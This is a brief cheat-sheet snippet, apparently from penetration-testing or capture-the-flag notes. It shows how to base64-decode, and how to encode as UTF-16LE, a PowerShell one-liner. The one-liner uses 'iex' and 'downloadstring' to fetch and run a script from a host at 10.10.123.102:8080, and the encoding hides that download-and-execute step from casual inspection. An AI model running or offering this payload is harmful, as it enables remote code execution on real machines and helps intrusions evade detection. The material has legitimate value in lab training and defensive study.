`decoding` with base64

```bash
echo "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8
AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAzAC4AMQAwADIAOgA4ADAAOAAwAC8AYgApAAoA" | base64 -d -w 0

iex (new-object net.webclient).downloadstring(http://10.10.123.102:8080/b)
```

`encoding` with base64

```bash
echo "iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")" | iconv -t UTF-16LE | base64 -w 0

aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAzAC4AMQAwADIAOgA4ADAAOAAwAC8AYgApAAoA
```